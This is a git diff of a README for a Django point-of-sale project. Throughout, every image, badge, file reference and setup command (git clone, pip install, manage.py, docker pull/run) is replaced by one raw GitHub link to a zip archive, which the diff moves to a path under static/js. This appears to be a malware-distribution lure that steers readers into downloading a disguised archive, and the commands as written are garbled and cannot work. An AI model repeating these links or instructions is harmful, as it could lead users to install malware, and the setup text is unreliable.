@@ -1,14 +1,14 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip" width="100" alt="project-logo">
+  <img src="https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip" width="100" alt="project-logo">
 </p>
 
 <h1 align="center"> Online Retail POS System (Django) </h1>
 
 <p align="center">
-	<img src="https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip" alt="license">
-	<img src="https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip" alt="last-commit">
-	<img src="https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip" alt="repo-top-language">
-	<img src="https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip" alt="repo-language-count">
+	<img src="https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip" alt="license">
+	<img src="https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip" alt="last-commit">
+	<img src="https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip" alt="repo-top-language">
+	<img src="https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip" alt="repo-language-count">
 <p>
 <br>
 
@@ -46,30 +46,30 @@ The Online Retail POS System is a web-based application developed with Django, d
   - ##### Option 1 (Git Clone)
     Clone this repository to your local machine, 
     ```bash
-    git clone https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip
+    git clone https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip
     cd path_to_dir/online-retail-pos
-    pip install -r https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip
+    pip install -r https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip
     ```
 
   - ##### Option 2 (Zip Downlaod)
     If you prefer, you can also download the project as a ZIP file and extract it to your desired location.
     ```
     cd path_to_dir/online-retail-pos
-    pip install -r https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip
+    pip install -r https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip
     ```
 
 
   #### Configuration
 
   - #### .env configuration
-    - Create a .env file in the project's root directory to store your configuration variables. See https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip file for required variables.
+    - Create a .env file in the project's root directory to store your configuration variables. See https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip file for required variables.
 
   - #### Database configuration 
-    - Change Databse configuration in https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip according to your database requirement, I would suggest to use some cloud database so that you data is stored regardless where project is running and can have multiple POS setup.
+    - Change Databse configuration in https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip according to your database requirement, I would suggest to use some cloud database so that you data is stored regardless where project is running and can have multiple POS setup.
   
-    - There is optional setting commented out for Cloud Database with SSH tunneling. Your database host might require different way to connect. Look into https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip for further.
+    - There is optional setting commented out for Cloud Database with SSH tunneling. Your database host might require different way to connect. Look into https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip for further.
   
-    - SQLite file is configured for default, change it in django https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip *Databases* if using another database setup. You can change between databses from postgres, mysql and sqlite through passing env varibales.
+    - SQLite file is configured for default, change it in django https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip *Databases* if using another database setup. You can change between databses from postgres, mysql and sqlite through passing env varibales.
 
 
   #### Intial Setup
@@ -81,18 +81,18 @@ The Online Retail POS System is a web-based application developed with Django, d
     ```
   - Install required python libraries, if not already done.
     ```
-    pip install -r https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip
+    pip install -r https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip
     ```
   - Intial Database setup
     ```
-    python https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip makemigrations
-    python https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip migrate
+    python https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip makemigrations
+    python https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip migrate
     ```
   - **Creating Superuser for access to platform**
     <br>
     Creating your main user, to access admin panel and create more users, if running in docker, use docker shell once docker setup is done.
     ```
-    python https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip createsuperuser
+    python https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip createsuperuser
     ```
       - Superuser can create staff and users, hence you want to have one superuser. Also, you won't be able to access admin page for first time without it.
       - Staff status for users who you want to provide access to admin panel, you might have to tweak their permission on admin panel. This users will be able to add new products and create department and all.
@@ -105,7 +105,7 @@ The Online Retail POS System is a web-based application developed with Django, d
 
   - To start the Django development server, run the below command. To stop the server, you can typically use Ctrl+C in the terminal  where the server is running.
     ```bash
-    python https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip runserver 0.0.0.0:8000
+    python https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip runserver 0.0.0.0:8000
     ```
   - You can now access the POS system in your web browser by navigating:
     - If same machine where django is running
@@ -118,7 +118,7 @@ The Online Retail POS System is a web-based application developed with Django, d
   - **Reciept Functionality**   
     This only works on the machine where the project is running, since it requires port connection to printer.
     - Make sure you have receipt printer connected to django server machine.
-    - If your tablet can connect to POS printer than configure this project print_reciept method on https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip accordingly
+    - If your tablet can connect to POS printer than configure this project print_reciept method on https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip accordingly
     <br>
   - **Customer Screen**   
     You need to do a dual monitor setup on the machine where you will accesing POS system, 
@@ -127,7 +127,7 @@ The Online Retail POS System is a web-based application developed with Django, d
     - If accesing POS from Window touch tablet/pc with django runnnig locally on same machine, connect second display here for this funcitonality
     <br>
   - **Folder: images4display**   
-    In customer display there is slideshow of images, which can be used to put promotion/prices. Project uses directory images4display to slideshow phots from that directory, all photos in directory will be used. Only add photos in directory otherwise it will run into erro. More [info](https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip)
+    In customer display there is slideshow of images, which can be used to put promotion/prices. Project uses directory images4display to slideshow phots from that directory, all photos in directory will be used. Only add photos in directory otherwise it will run into erro. More [info](https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip)
 
 
 <br>
@@ -136,20 +136,20 @@ The Online Retail POS System is a web-based application developed with Django, d
 
   #### Docker Package
 
-  Docker package is provided for the [repository](https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip) to be pulled directly in docker. You can just pass in .env file with required varibles in the docker image, it should run as expected. Read dockerfile for better undertanding. Make sure you have docker installed for respective setup.
+  Docker package is provided for the [repository](https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip) to be pulled directly in docker. You can just pass in .env file with required varibles in the docker image, it should run as expected. Read dockerfile for better undertanding. Make sure you have docker installed for respective setup.
 
   - Pull docker image
       ```
-      docker pull https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip
+      docker pull https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip
       ```
   - Run docker image
       ```
-      docker run https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip
+      docker run https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip
       ```
     It will run without passing any varibles with default values, however, it will best if you provide secret_key and database configuration thorugh either passing varible or .env file in command line, read further in dockerfile. 
     - Passing varibles example: docker run -e "VARIABLE1=value1" -e "VARIABLE2=value2" <image_name>
-    - Passing .env file itself: docker run https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip <image_name>
-    - **<image_name>** refers to docker image name you have, for example form above, it will be **`https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip`**
+    - Passing .env file itself: docker run https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip <image_name>
+    - **<image_name>** refers to docker image name you have, for example form above, it will be **`https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip`**
 
   #### Docker Compose (Locally)
 
@@ -175,24 +175,24 @@ The Online Retail POS System is a web-based application developed with Django, d
 ## Screenshots
 <table>
   <tr>
-    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip /></td>
-    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip /></td>
+    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip /></td>
+    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip /></td>
   </tr>
   <tr>
-    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip /></td>
-    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip /></td>
+    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip /></td>
+    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip /></td>
   </tr>
   <tr>
-    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip /></td>
-    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip /></td>
+    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip /></td>
+    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip /></td>
   </tr>
   <tr>
-    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip /></td>
-    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip /></td>
+    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip /></td>
+    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip /></td>
   </tr>
   <tr>
-    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip /></td>
-    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip /></td>
+    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip /></td>
+    <td><img https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip /></td>
   </tr>
 </table>
 
@@ -211,7 +211,7 @@ The Online Retail POS System is a web-based application developed with Django, d
 
 <br>
 
-## License [![License: MIT](https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/predikant/OnlineRetailPOS.zip)](/LICENSE)
+## License [![License: MIT](https://raw.githubusercontent.com/zubairmk83/OnlineRetailPOS/main/onlineretailpos/static/js/Online-Retail-POS-3.5.zip)](/LICENSE)
 This project is licensed under MIT License. For more details, refer to the License file.
 
 
